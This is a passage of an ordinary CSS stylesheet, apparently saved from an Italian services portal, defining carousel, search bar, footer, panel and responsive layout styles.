    font-size: 44px;
}


/* carousel c */

.carousel-c .item {
    height: 420px;
}

.carousel-c .carousel-indicators {
    bottom: 40px;
}

.carousel-c .carousel-text .carousel-text-wrap {
    vertical-align: bottom;
    height: 390px;
}

.carousel-c .carousel-text .carousel-text-wrap .carousel-text-heading {
    font-size: 40px;
}

.carousel-c .carousel-text .carousel-text-wrap p {
    font-size: 20px;
}


/* carousel d */

.carousel-d .item {
    height: 600px;
    background-color: #f6f6f6;
}

.carousel-d .carousel-text .carousel-text-wrap {
    vertical-align: middle;
    height: 600px;
}

.carousel-d .carousel-text .carousel-text-wrap .carousel-text-heading {
    font-size: 44px;
}

.carousel-d .carousel-indicators {
    top: 0;
    right: 0;
    bottom: auto;
    left: auto;
    width: 200px;
    z-index: 9;
}

.carousel-d .carousel-indicators li {
    border: medium none;
    display: block;
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    border-radius: 0px;
    height: 200px;
    width: 200px;
    margin: 0;
}

.carousel-d .carousel-indicators img {
    border: none;
    float: left;
}

.carousel-d .carousel-indicators .active {
    display: none;
}

.carousel-fade .carousel-inner .item {
    -webkit-transition-property: opacity;
    transition-property: opacity;
}

.carousel-fade .carousel-inner .item,
.carousel-fade .carousel-inner .active.left,
.carousel-fade .carousel-inner .active.right {
    opacity: 0;
}

.carousel-fade .carousel-inner .active,
.carousel-fade .carousel-inner .next.left,
.carousel-fade .carousel-inner .prev.right {
    opacity: 1;
}

.carousel-fade .carousel-inner .next,
.carousel-fade .carousel-inner .prev,
.carousel-fade .carousel-inner .active.left,
.carousel-fade .carousel-inner .active.right {
    left: 0;
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
}

.carousel-fade .carousel-control {
    z-index: 2;
}

/* carousel bg */

.carousel-bg .carousel-overlay {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/row-033.png*/ url();
    background-position: bottom;
    background-repeat: repeat-x;
    background-position: 0px 80px;
    height: 100%;
}

.carousel-bg .item {
    height: 400px;
    background-position: center right;
}

.carousel-bg .carousel-text .carousel-text-wrap {
    vertical-align: bottom;
    height: 360px;
}

.carousel-bg .carousel-text .carousel-text-wrap .carousel-text-heading {
    padding-bottom: 10px;
    font-size: 44px;
}
.carousel-bg .carousel-text .note {
  color:#ccc;
}


/* carousel e */

.carousel-e .item {
    height: 250px;
    background-color: #ececec;
}

.carousel-e .carousel-text {
    position: relative;
    height: 250px;
}

.carousel-e .carousel-text .carousel-text-wrap {
    position: absolute;
    bottom: 0px;
    left: 0;
    vertical-align: middle;
    height: 210px;
    padding: 30px 75px 10px 40px;
}

.carousel-e .carousel-text .carousel-text-wrap .carousel-text-heading {
    padding-bottom: 10px;
    margin-top: 0;
    font-size: 26px;
}

.carousel-e .carousel-indicators {
    bottom: 0;
}

.carousel-e .carousel-indicators li {
    background-color: #ebebeb;
    border: none;
}

.carousel-e .carousel-indicators li.active {
    background-color: #d8d8d8;
}


/***************************/

/******* Scadenzario *******/

/***************************/

.media-group-timetable {
    margin-bottom: 15px;
}

.media-group-timetable .media {
    padding: 10px 0 20px;
    margin-top: 10px;
}

.media-group-timetable .media {
    border-bottom: 1px solid #ececec;
}

.media-group-timetable .media .media-body p {
    margin: 0;
}

.media-group-timetable .date-detail {
    background-color: #fff;
    border: 1px solid #ececec;
    border-top: 3px solid #ececec;
    padding: 6px 10px;
    width: 64px;
}


/***************************/

/******* Search *******/

/***************************/

/* contenitore cerca con link */

.searchbar {
    position: absolute;
    top: -38px;
    width: 100%;
    background-color: #fff;
    border: 1px solid #ececec;
}

.searchbar-wrap {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-barsearch.png*/ url();
    background-position: right 20px center;
    background-repeat: no-repeat;
}

.searchbar a {
    display: block;
    width: 100%;
    height: 75px;
    font-size: 18px;
    font-style: italic;
    padding: 0 85px 0 25px;
    color: #787878;
    line-height: 75px;
}

.searchbar a:hover {
    text-decoration: none;
}


/* contenitore cerca con input */

.content-search {
    position: relative;
}

.container-box-search {
    background: #fff;
    padding: 10px;
    border: 1px solid #ececec;
    position: absolute;
    top: -36px;
    width: 100%;
}

.container-box-search .input-search {
    border: none;
    font-size: 24px;
    height: 48px;
    letter-spacing: 0.8px;
    line-height: 1.65 rem;
}


/***************************/

/******* Overlaybg text *******/

/***************************/
.myOverlay-bg-creative{
   background-image: url("/risorse_dt/condivise/immagini/generiche/myblock-bg-creative.png");
   background-repeat: no-repeat;
   background-position: center;
   min-height: 250px;
   display: flex;
   justify-content: center;
   align-items: center;
}
.myOverlay-bg-container{
position: relative;
}
/***************************/

/******* Pagina Assistenza *******/

/***************************/

/* btn */

.assistance-container {
    margin-top: 0px;
}


/***************************/

/******* Footer *******/

/***************************/

.content-footer,
.content-footer a {
    color: #222427;
    font-size: 16px;
}

.content-footer-post,
.content-footer-post a {
    color: #787878;
    font-size: 14px;
}

.content-footer-pre {
    padding: 100px 0 30px;
    background-color: #eedc00;
}

.content-footer-app {
    padding: 40px 0 30px;
    background-color: #fff;
}

.content-footer-post {
    padding: 30px 0;
    background-color: #ececec;
}

.content-footer-pre .extra-footer-column {
    margin: 15px 0 35px;
}

.content-footer-pre .extra-footer-column li {
    padding: 5px 0 0;
}

.content-footer-pre .extra-footer-column li a {
    font-weight: normal;
}

.content-footer-pre .panel-group-accordion .panel {
    background-color: transparent;
    border-bottom-color: #787878;
}

.content-footer-pre .panel-group-accordion .panel .panel-heading {
    padding-left: 0;
}

.content-footer-post .base-footer {
    text-align: center;
}

.content-footer-post .base-footer a,
.content-footer-post .base-footer a.first-base-footer-element {
    border-right: 1px solid #d0d0d0;
}

.content-footer-post .base-footer a.last-base-footer-element {
    border-right: none;
}

.content-footer-post .base-footer a {
    float: none;
    padding: 0 25px;
    font-weight: normal;
}

.content-footer-app .app-footer-column {
    margin: 0;
}

.content-footer-app .app-footer-column a {
    font-weight: normal;
    font-size: 16px;
    text-decoration: none;
    display: block;
    height: 60px;
    width: 100%;
    padding-left: 70px;
    background-position: left top;
    background-repeat: no-repeat;
    background-size: 60px;
    margin-bottom: 20px;
}

.content-footer-app .app-footer-column a span {
    display: table-cell;
    vertical-align: middle;
    height: 60px;
}


/* thumbnail */

.thumbnail {
    padding: 0;
    -moz-border-radius: 0px;
    -webkit-border-radius: 0px;
    border-radius: 0px;
}


/* iFrame */

.content-main-iframe {
    padding-top: 0;
}

.content-main-iframe iframe {
    padding-top: 30px;
}

.main-pills iframe.iframe-basic {
    width: 100%;
    border: none;
    min-height: 450px;
}


/* scroll top */

.back-to-top {
    background-repeat: no-repeat;
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-freccia-up.png*/ url();
    background-size: 24px;
    background-position: center;
    background-color: transparent;
    margin: 0;
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 50px;
    height: 50px;
    z-index: 100;
    display: none;
    text-decoration: none;
    color: #fff;
    background-color: #eedc00;
    border-radius: 30px;
    -webkit-box-shadow: 1px 1px 5px 0px rgba(50, 50, 50, 0.65);
    -moz-box-shadow: 1px 1px 5px 0px rgba(50, 50, 50, 0.65);
    box-shadow: 1px 1px 5px 0px rgba(50, 50, 50, 0.65);
}


/***************************/

/******* Forzatura img (retina srcset bugfix) *******/

/***************************/

/* Forzatura loghi principali */

.logo-image-pi-default {
    width: 194px;
}

.logo-image-pi-medium {
    width: 128px;
}

.logo-image-pi-small {
    width: 110px;
}

.logo-image-pass-default {
    width: 386px;
}

.logo-image-pvita-default {
    width: 252px;
}

.logo-image-ppay-default {
    width: 240px;
}

.logo-image-bfondi-default {
    width: 460px;
}

.logo-image-pid-default {
    width: 170px;
}

.logo-image-cdp-default {
    width: 189px;
}


/* Forzatura icone */

.social-icon {
    width: 30px;
}

.wizard-icon {
    width: 80px;
}


/* Forzatura icone cta */

.btn img {
    width: 24px;
}

.icon-scroll,
.icon-scroll:before {
    position: absolute;
    left: 50%;
}


/* Icon Scroll */

.icon-scroll {
    width: 40px;
    height: 70px;
    margin-left: -20px;
    bottom: 70px;
    margin-top: -35px;
    box-shadow: inset 0 0 0 2px #fff;
    border-radius: 25px;
    position: absolute;
    left: 50%;
    opacity: 1;
}

.icon-scroll:before {
    content: '';
    width: 8px;
    height: 8px;
    background: #fff;
    margin-left: -4px;
    top: 8px;
    border-radius: 4px;
    -webkit-animation-duration: 1.5s;
    animation-duration: 1.5s;
    -webkit-animation-iteration-count: infinite;
    animation-iteration-count: infinite;
    -webkit-animation-name: iconscrollanimation;
    animation-name: iconscrollanimation;
}


/*xs*/

@media (max-width: 767px) {
    .ellipsis-xs {
        white-space: nowrap;
        text-overflow: ellipsis;
        overflow: hidden;
    }
    .ellipsis-xs-not {
        white-space: normal;
        text-overflow: inherit;
        overflow: inherit;
    }
    .equalize-height-xs-not {
        height: auto !important;
        min-height: auto !important;
    }
    .main-pills .onlayer {
        margin-right: -20px !important;
        margin-left: -20px !important;
    }
    .main-pills-basic .onlayer {
        margin-right: 0px !important;
        margin-left: 0px !important;
    }
    #bracket {
        width: auto !important;
        margin-top: 30px;
    }
    #bracket .bracket-pills.border-xs-bottom,
    #bracket .bracket-pills.border-sm-bottom,
    #bracket .bracket-pills.border-md-bottom,
    #bracket .bracket-pills.border-lg-bottom {
        margin-bottom: 20px;
        padding-bottom: 20px;
    }
    .content-federation-bar .header-minified .federation-bar-wrap ul.dropdown-menu-federation,
    .content-header .header-minified ul.dropdown-menu-federation {
        right: -11px;
        top: 50px;
    }
    .content-federation-bar {
        display: none;
    }
    .content-federation-bar-simplified {
        display: block !important;
    }
    .content-federation-bar-minified .federation-bar-wrap a.pi-targetarea,
    .content-federation-bar-simplified .federation-bar-wrap a.pi-targetarea {
        display: inline;
        text-indent: -9999px;
        padding: 4px 18px;
    }
    .content-federation-bar-minified .header-minified .back a,
    .content-federation-bar-simplified .header-simplified .back a {
        padding: 22px;
    }
    /*.content-federation-bar-minified .header-minified .back a span,
    .content-federation-bar-simplified .header-simplified .back a span {
        text-indent: -9999;
    }*/
    .content-federation-bar-minified,
    .content-federation-bar-simplified {
        height: 44px;
        line-height: 43px;
    }
    .header-minified {
        padding: 0 11px 0 8px;
    }
    .header-minified .logo-mobile {
        padding: 2px 0 0 4px;
    }
    .content-header {
        height: 44px;
    }
    .content-header .notified {
        content: '';
        display: inline-block;
        width: 10px;
        height: 10px;
        -moz-border-radius: 15px;
        -webkit-border-radius: 15px;
        border-radius: 15px;
        background-color: #ff3636;
        text-indent: -9999px;
        position: absolute;
        top: 10px;
        left: 21px;
    }
    .content-federation-bar-minified .header-minified .notified {
        content: '';
        display: inline-block;
        width: 10px;
        height: 10px;
        -moz-border-radius: 15px;
        -webkit-border-radius: 15px;
        border-radius: 15px;
        background-color: #ff3636;
        text-indent: -9999px;
        position: absolute;
        top: 10px;
        left: 11px;
    }
    .content-header a.dropdown-toggle {
        padding: 0 15px;
        background-position: center top 13px;
    }
    ul.dropdown-menu-federation::before {
        right: 8% !important;
    }
    .submenu-product .submenu-product-inner {
        padding: 0;
    }
    .dropdown-toggle-login span.label-username,
    .dropdown-toggle-assistance span.label-assistence {
        display: none;
    }
    .dropdown-toggle-login a,
    .dropdown-toggle-assistance a {
        width: 25px;
        height: 25px;
    }
    span.caret {
        visibility: hidden;
        height: 0;
        width: 0;
        margin: 0;
        padding: 0;
        border: none;
    }
    .content-applicative,
    .content-main {
        padding: 30px 0 20px;
    }
    .content-footer-pre,
    .content-footer-app {
        padding: 30px 0 20px;
    }
    .content-footer-pre .extra-footer-column {
        margin: 0;
        padding: 0;
    }
    .content-footer-pre .panel-body {
        padding-top: 0;
    }


    .content-footer-post .base-footer a {
        padding: 0 15px;
    }
    .content-footer-post .base-footer a.first-base-footer-element {
        padding-left: 0px;
    }

    .content-footer-post .base-footer a.last-base-footer-element {
        padding-right: 0px;
    }



    .content-overflow.content-overflow-visible-xs {
        overflow-x: scroll;
    }
    .content-overflow-visible-xs .content-overflow-wrap {
        width: 960px;
    }
    .abstract-picture {
        text-align: center;
    }
    .welcome .abstract h1 {
        font-size: 30px
    }
    .welcome .abstract h1 span {
        display: block;
        font-size: 35px;
        font-weight: 600;
    }
    .main-pills .main-pills-wrap .scroll-content {
        height: auto !important;
        overflow-y: visible;
    }
    .main-pills .main-pills-wrap {
        padding: 20px;
        background-image: none !important;
    }
    .main-pills.main-pills-bg .main-pills-wrap {
        background-image: none !important;
    }
    .main-pills-wrap .btn-container-abs.btn-container-bottom {
        bottom: -45px;
    }
    .main-messages .main-messages-wrap {
        padding: 20px 20px 20px 55px;
        background-position: 0 22px;
        margin-left: 10px;
    }
    .panel-dashboard .dashboard-wrap {
        padding: 10px 0px;
        background-repeat: no-repeat;
        background-position: top left;
        background-size: 30px;
        min-height: 40px;
    }
    .panel-dashboard .dashboard-wrap-radio,
    .panel-dashboard .dashboard-wrap-checkbox {
        padding-left: 40px;
    }
    .panel-dashboard .dashboard-wrap .dashboard-heading {
        padding: 0;
        border: none;
    }
    .panel-dashboard .dashboard-wrap-date-simple,
    .panel-dashboard .dashboard-wrap-date-complete {
        padding-top: 40px;
    }
    .panel-dashboard .dashboard-wrap .dashboard-subcontent {
        display: inline-block;
        min-height: 40px;
        height: auto;
        width: 100%;
    }
    .panel-dashboard .dashboard-wrap .dashboard-abs {
        top: 20px;
    }
    .panel-dashboard .dashboard-wrap .date-detail span {
        display: inline-block;
    }
    .panel-dashboard .dashboard-wrap .dashboard-abs .date-detail .date-day {
        font-size: 22px;
        line-height: 22px;
    }
    .panel-dashboard .dashboard-wrap .dashboard-abs .date-detail .date-month {
        font-size: 22px;
        line-height: 22px;
    }
    .panel-dashboard .counter {
        margin: 5px 0 10px;
    }
    .box-editable-spacing,
    .main-pills {
        margin-bottom: 20px;
    }
    .panel .panel-badge,
    .panel-cards .panel-badge{
      right: 20px;
    }
    /* Abstract */
    .content-abstract,
    .content-abstract .abstract {
        padding: 10px 0;
    }
    .content-abstract .abstract-heading {
        text-align: center;
        margin-bottom: 20px;
    }
    /* Submenu */
    .submenu-product #submenu-product-main-item .dropdown-toggle {
        padding-left: 24px;
    }
    .submenu-product #submenu-product-main-item .dropdown-toggle-wrap {
        display: block;
        height: 34px;
        vertical-align: middle;
    }
    .submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu {
        right: 0%;
    }
    .submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu::before {
        right: 8%;
    }
    .submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu li:hover {
        background-color: transparent;
    }
    .submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu li ul {
        list-style: none;
        padding: 0;
    }
    .submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu li ul li:hover {
        background-color: #f5f5f5;
    }
    .submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu li a {
        padding: 10px 30px 5px;
    }
    .submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu li ul li a {
        padding: 10px 35px;
    }
    .submenu-product #submenu-product-main-item .dropdown-toggle-wrap .dropdown-menu li ul li:hover a {
        color: #0047bb;
    }
    .submenu-product #submenu-product-main-item > li:first-child {
        display: block;
        width: 100%;
        border-bottom: 1px solid #ececec;
    }
    .submenu-product #submenu-product-main-item > li:first-child a {
        text-align: left;
    }
    .submenu-product #submenu-product-main-item > li:first-child a.dropdown-toggle {
        text-align: center;
    }
    /* App Navigation */
    .wrap-application-nav ul.application-nav li.ico-single-element-standard a {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-cruscotto.png*/ url();
        background-repeat: no-repeat;
        background-position: center bottom 4px;
        background-size: 24px;
        text-indent: -9999px;
        width: 25px;
        height: 25px;
    }
    .wrap-application-nav ul.application-nav li.ico-single-element-standard a:hover,
    .wrap-application-nav ul.application-nav li.ico-single-element-standard a.active {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-blue/ico-cruscotto.png*/ url();
    }
    /* Panel */
    .panel-cards {
        margin-bottom: 20px;
    }
    .panel-cards:hover {
        box-shadow: none;
    }
    .panel-cards.panel-cards-bg-double,
    .panel-cards.panel-detailed-cards-bg {
        background-image: none !important;
    }
    .panel-detailed-cards .advantage-detail,
    .panel-detailed-cards-bg .advantage-detail {
        border-bottom: 1px solid #ececec;
        border-right: none;
        padding-bottom: 20px;
        margin-bottom: 20px;
        min-height: 120px;
    }
    .panel-detailed-cards .price-info,
    .panel-detailed-cards-bg .price-info {
        text-align: left;
    }
    .panel-detailed-cards .price-detail,
    .panel-detailed-cards-bg .price-detail {
        float: left;
    }
    .panel-detailed-cards-bg p.level-info {
        display: block;
        height: auto;
    }
    .panel-cards-basic .panel-wrap,
    .panel-cards-default .panel-wrap,
    .panel-cards-default-icon .panel-wrap,
    .panel-cards-services .panel-wrap,
    .panel-cards-news .panel-wrap,
    .panel-cards-media .panel-wrap,
    .panel-cards-bg-double .panel-wrap,
    .panel-detailed-cards .panel-wrap,
    .panel-detailed-cards-bg .panel-wrap {
        padding: 20px 20px 45px;
    }
    .panel-cards-bg-promo .panel-wrap {
        padding: 20px 20px 45px 20px;
    }
    .panel-cards-medium .panel-wrap {
        padding: 15px 20px 45px;
    }
    .panel-cards-large .panel-wrap {
        padding: 15px 20px 45px;
    }
    .panel-cards-xlarge {
        min-height: auto;
    }
    .panel-cards-xlarge .panel-wrap-pre {
        padding: 15px 20px 45px;
    }
    .panel-cards-xlarge .panel-wrap-pre {
        background-position: center center;
    }
    .panel-cards.panel-cards-bg-promo .panel-wrap-pre {
        background-image: none !important;
    }
    .panel-cards.panel-cards-bg-promo .panel-wrap-pre .panel-heading,
    .panel-cards.panel-cards-bg-promo .panel-wrap .panel-body {
        min-height: auto;
    }
    .panel-cards-services {
        margin-bottom: 20px;
    }
    .panel-cards-media .panel-media {
        margin-bottom: 20px;
    }
    .panel-detailed-cards .panel-link-pos1,
    .panel-detailed-cards-bg .panel-link-pos1,
    .panel-detailed-cards .panel-link-abs,
    .panel-detailed-cards-bg .panel-link-abs,
    .panel-link-pos1 {
        bottom: 10px;
    }
    .panel-cards-xlarge .panel-heading h4 {
        font-size: 32px;
        margin: 10px 0 10px;
    }
    .panel-tools-static .panel-heading .tablecell-like {
        height: 40px;
    }
    .panel-tools-static .panel-heading .radio,
    .panel-tools-static .panel-heading .checkbox {
        line-height: 40px;
    }
    .panel-cards-opacity {
        min-height: 300px !important;
    }
    /* Tabs */
    .vertical-tab-content {
        min-height: auto;
    }
    .vertical-tab-content-right .tab-pane-content {
        padding: 12px 0px 0px 0px;
    }
    .vertical-tab-content-left .tab-pane-content {
        padding: 12px 0px 0px 0px;
    }
    .horizontal-nav-tabs > li > a {
        padding: 10px 20px;
    }
    /* segments */
    /*
    .segments {
        border: none;
    }
    .segments > li {
        display: list-item;
        float: left;
        margin-right: 10px;
    }
    .segments > li .segment-content span.segment-desc {
        display: none;
    }
    .segments > li .segment-content span.segment-number {
        background-color: transparent;
        color: #fff;
        background-image: url(/risorse_dt/condivise/immagini/generiche/list-step.png);
        background-repeat: no-repeat;
        background-position: center;
        padding: 0px 8px;
        width: 24px;
        text-align: center;
        display: inline-block;
    }
    .segments > li.active .segment-content {
        background-color: #fff;
    }
    .segments > li.active .segment-content span.segment-number {
        background-image: url(/risorse_dt/condivise/immagini/generiche/list-step-active.png);
    }
    .segments > li.active .segment-content span.segment-desc {
        display: inline-block;
        color: #0047bb;
        padding-left: 7px;
    }
    */
    /* Steps */
    .steps > li {
        background-image: none;
        padding-right: 0;
    }
    .steps > li .step-content span.step-desc {
        display: none;
    }
    .steps > li.active .step-content span.step-desc {
        display: inline-block;
    }
    .steps > li a .step-content span.step-number {
        color: #fff;
    }
    .steps.steps-internal > li {
        background-image: none;
        padding-bottom: 10px;
        float: none;
    }
    .steps.steps-internal > li .step-content span.step-desc {
        display: inline-block;
    }
    /* BreadCrumb type a - Trim totale */
    .breadcrumb.breadcrumb-xs-trim-a li + li:not(:last-child) span[name="trim"] {
        text-indent: -9999px;
        padding: 0;
        vertical-align: middle;
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 10px;
        display: block;
        z-index: 2;
    }
    .breadcrumb.breadcrumb-xs-trim-a li + li:not(:last-child):after {
        content: "...";
    }
    .breadcrumb.breadcrumb-xs-trim-a li + li:not(:last-child):hover:after {
        content: "";
    }
    .breadcrumb.breadcrumb-xs-trim-a li + li:not(:last-child):hover span[name="trim"] {
        text-indent: 0px;
        position: relative;
        left: auto;
    }
    /* BreadCrumb type b - Trim su larghezza (controllo presenza span escludendo l'ultimo elemento) */
    .breadcrumb.breadcrumb-xs-trim-b li + li:not(:last-child) span[name="trim"] {
        display: inline-block;
        padding: 0;
        vertical-align: middle;
        max-width: 60px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
    }
    .breadcrumb.breadcrumb-xs-trim-b li + li:not(:last-child) span[name="trim"]:hover {
        max-width: none;
    }
    /* Forms */
    .box-evidence {
        padding: 15px;
    }
    fieldset,
    .fieldset {
        margin-bottom: 35px;
        padding: 0 0 25px;
    }
    .tag {
        margin-right: 0;
        /* truncate overflow text */
        overflow: hidden;
        text-overflow: ellipsis;
        width: 100%;
        white-space: nowrap;
    }
    .filter-limit {
        display: table;
        width: 100%;
        margin-top: 20px;
    }
    .filter-limit li {
        display: table-cell;
        vertical-align: middle;
        padding-left: 10px;
        padding-right: 10px;
        text-align: center;
    }
    .filter-limit li:first-child {
        padding-left: 0px;
    }
    .filter-limit li:last-child {
        padding-right: 0px;
    }
    .filter-limit li span {
        padding: 4px 15px;
    }
    .form-pincode .form-group-lg {
        margin-bottom: 10px
    }
    /*carousel all*/
    .carousel .container {
        height: 100%;
    }
    .carousel .item {
        background-repeat: no-repeat;
    }
    .carousel-control {
        /*display: none;*/
        width: 40px;
        height: 40px;
    }
    .carousel-control .glyphicon-chevron-left,
    .carousel-control .icon-prev {
        margin-left: -10px;
    }
    .carousel-control .glyphicon-chevron-right,
    .carousel-control .icon-next {
        margin-right: -10px;
    }
    .carousel-control .glyphicon-chevron-left,
    .carousel-control .glyphicon-chevron-right,
    .carousel-control .icon-prev,
    .carousel-control .icon-next {
        margin-top: -10px;
    }
    /*carousel-a1*/
    .carousel-a1 .item {
        height: 390px;
    }
    .carousel-a1 .carousel-text .carousel-text-wrap {
        height: 360px;
    }
    .carousel-a1 .carousel-overlay {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/row-020l-033.png*/ url();
        background-repeat: repeat-x;
        height: 100%;
    }
    .carousel-a1 .carousel-text.carousel-text-small .carousel-text-wrap .carousel-text-heading {
        font-size: 36px;
        line-height: 1.0;
    }
    .carousel-a1 .carousel-text.carousel-text-small .carousel-text-wrap p {
        font-size: 18px;
    }
    .carousel-a1 .banner-advice {
        bottom: -28px;
    }
    /*carousel-a2*/
    .carousel-a2 .item {
        background-position: center right;
    }
    .carousel-a2 .carousel-overlay {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/pixel-040.png*/ url();
        color: #fff !important;
    }
    /*carousel-b*/
    .carousel-b .item {
        background-position: left 30% center;
    }
    .carousel-b .carousel-overlay {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/pixel-040.png*/ url();
        color: #fff !important;
    }
    /*carousel-l*/
    .carousel-l1 .item,
    .carousel-l2 .item,
    .carousel-l3 .item {
        height: 480px;
    }
    .carousel-l1 .item {
        background-position: center;
    }
    .carousel-l2 .item {
        background-position: right 30% center;
    }
    .carousel-l3 .item {
        background-position: left 30% center;
    }
    .carousel-l1 .carousel-text .carousel-text-wrap,
    .carousel-l2 .carousel-text .carousel-text-wrap,
    .carousel-l3 .carousel-text .carousel-text-wrap {
        height: 480px;
        padding: 50px 0 35px;
    }
    .carousel-l1 .carousel-text .carousel-text-wrap,
    .carousel-l2 .carousel-text .carousel-text-wrap,
    .carousel-l3 .carousel-text .carousel-text-wrap {
        vertical-align: bottom;
    }
    .carousel-l2 .carousel-overlay,
    .carousel-l3 .carousel-overlay {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/row-033.png*/ url();
        /*background-image: url(/risorse_dt/condivise/immagini/generiche/row-020l-033.png);*/
        background-position: bottom;
        background-repeat: repeat-x;
        height: 100%;
    }
    /*carousel-c*/
    .carousel-c .carousel-text .carousel-text-wrap .carousel-text-heading {
        font-size: 36px;
    }
    .carousel-c .carousel-overlay {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/row-033.png*/ url();
        /*background-image: url(/risorse_dt/condivise/immagini/generiche/row-020l-033.png);*/
        background-position: bottom;
        background-repeat: repeat-x;
        height: 100%;
    }
    /*carousel-d*/
    .carousel-d .item {
        background-position: center right;
    }
    .carousel-d .item,
    .carousel-d .carousel-text .carousel-text-wrap {
        height: 400px;
    }
    .carousel-d .carousel-text .carousel-text-wrap {
        text-align: center;
    }
    .carousel-d .carousel-overlay {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/pixel-040.png*/ url();
    }
    /*carousel-e*/
    .carousel-e .carousel-text .carousel-text-wrap {
        height: 235px;
        padding: 30px 60px 30px 20px;
        background-size: cover;
    }
    .carousel-e .carousel-text .carousel-text-wrap .carousel-text-heading {
        font-size: 20px;
    }
    /*modal*/
    .modal-stretch {
        /*width: auto;*/
        padding: 0;
    }
    .modal-fullpage button.close {
        right: 1%;
    }
    /* searchbar */
    .container-box-search .input-search {
        font-size: 18px;
    }
    /* Forzatura loghi principali */
    .logo-image-pass-default {
        width: 271px;
    }
    .logo-image-pvita-default {
        width: 176px;
    }
    .logo-image-bfondi-default {
        width: 350px;
    }
    .logo-image-ppay-default {
        width: 168px;
    }
    /* Allineamenti verticali custom */
    .table-like-note,
    .table-like-note .tablerow-like,
    .table-like-note .tablecell-like {
        display: block;
    }
    .table-like-note .tablerow-like:first-child .tablecell-like {
        height: auto;
        padding: 10px 0;
    }
    .table-like-note {
        margin-top: 10px;
    }
    /* Icon Scroll*/
    .icon-scroll {
        display: none;
    }
    /* Social Bar */
    .social-bar-container ul.social-bar{
       float: left;
    }

    /* Liste specifiche*/
    /*
    .list-bordered li{
      padding: 0;
      display: block;
      width: 100%;
      float: none;
      border: none;
   }
   */
   .list-file-detailed li{
     background-position: left 30px;
   }
}


/*sm*/

@media (min-width: 768px) and (max-width: 991px) {
    .ellipsis-sm {
        white-space: nowrap;
        text-overflow: ellipsis;
        overflow: hidden;
    }
    .ellipsis-sm-not {
        white-space: normal;
        text-overflow: inherit;
        overflow: inherit;
    }
    .equalize-height-sm-not {
        height: auto !important;
        min-height: auto !important;
    }
    #bracket {
        width: auto !important;
        margin-top: 30px;
    }
    .content-federation-bar {
        display: none;
    }
    .content-federation-bar-simplified {
        display: block !important;
    }
    .content-federation-bar-minified .federation-bar-wrap a.pi-targetarea,
    .content-federation-bar-simplified .federation-bar-wrap a.pi-targetarea {
        display: inline;
        text-indent: -9999px;
        padding: 4px 18px;
    }
    .content-federation-bar-minified .header-minified .back a,
    .content-federation-bar-simplified .header-simplified .back a {
        padding: 22px;
    }
    /*.content-federation-bar-minified .header-minified .back a span,
    .content-federation-bar-simplified .header-simplified .back a span {
        text-indent: -9999;
    }*/
    .content-federation-bar .header-minified .federation-bar-wrap ul.dropdown-menu-federation::before,
    .content-header .header-minified ul.dropdown-menu-federation::before {
        right: 4%;
    }
    .content-federation-bar .header-minified .federation-bar-wrap ul.dropdown-menu-federation,
    .content-header .header-minified ul.dropdown-menu-federation {
        right: -11px;
        top: 50px;
    }

    .content-header .notified {
        content: '';
        display: inline-block;
        width: 10px;
        height: 10px;
        -moz-border-radius: 15px;
        -webkit-border-radius: 15px;
        border-radius: 15px;
        background-color: #ff3636;
        text-indent: -9999px;
        position: absolute;
        top: 10px;
        left: 21px;
    }
    .content-federation-bar-minified .header-minified .notified {
        content: '';
        display: inline-block;
        width: 10px;
        height: 10px;
        -moz-border-radius: 15px;
        -webkit-border-radius: 15px;
        border-radius: 15px;
        background-color: #ff3636;
        text-indent: -9999px;
        position: absolute;
        top: 10px;
        left: 11px;
    }
    .content-federation-bar-minified,
    .content-federation-bar-simplified {
        height: 44px;
        line-height: 44px;
    }
    .header-minified {
        padding: 0 12px 0 8px;
    }
    .header-minified .logo-mobile {
        padding: 2px 0 0 4px;
    }
    .content-header {
        height: 44px;
    }
    .content-header a.dropdown-toggle {
        padding: 0 15px;
        background-position: center top 13px;
    }
    .content-header ul.dropdown-menu-federation::before {
        right: 5%;
    }
    .content-applicative,
    .content-main {
        padding: 30px 0 20px;
    }
    .abstract-picture {
        text-align: center;
    }
    .content-overflow.content-overflow-visible-sm {
        overflow-x: auto;
    }
    .content-overflow-visible-sm .content-overflow-wrap {
        width: 960px;
    }
    /* Panel */
    .panel-detailed-cards .price-value {
        font-size: 48px;
    }
    .panel-detailed-cards .price-currency {
        font-size: 18px;
        line-height: 36px;
        letter-spacing: 3px;
    }
    .panel-detailed-cards .price-subvalue {
        font-size: 20px;
    }
    .panel-cards.panel-cards-bg-double,
    .panel-cards.panel-detailed-cards-bg {
        background-image: none !important;
    }
    .panel-detailed-cards-bg .price-detail,
    .panel-detailed-cards-bg .price-info {
        margin-top: 0 !important;
    }
    .panel-cards-medium .panel-wrap,
    .panel-cards-large .panel-wrap,
    .panel-cards-xlarge .panel-wrap {
        padding: 15px 30px 45px;
    }
    .panel-cards-basic .panel-wrap,
    .panel-cards-default .panel-wrap,
    .panel-cards-default-icon .panel-wrap,
    .panel-cards-news .panel-wrap,
    .panel-cards-bg-double .panel-wrap {
        padding: 25px 30px 45px;
    }
    .panel-cards-media .panel-wrap {
        padding: 25px 30px;
    }
